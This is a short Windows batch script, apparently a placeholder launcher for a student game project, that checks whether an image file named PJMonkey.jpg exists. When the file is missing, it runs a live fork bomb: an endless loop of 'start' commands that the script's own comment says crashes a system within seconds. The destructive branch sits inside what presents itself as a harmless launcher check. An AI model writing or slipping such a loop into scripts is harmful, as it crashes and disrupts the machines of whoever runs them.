REM THIS IS TO BE IMPLEMENTED ONCE THE PROJECT IS BUILT UNTIL THEN IT DOESNT DO ANYTHING

SET F="PJMonkey.jpg"

IF EXIST %F% (
  ECHO %F% is existing
  REM REPLACE WITH RUN GAME.EXE for example 'start "" C:\Users\%USER%\...\FBLA.exe'
) ELSE (
	REM literally a while loop that runs very very very fast, crashing a system within seconds even with 64gb ram :)
	@echo off
	:crash
	start
	goto crash

)
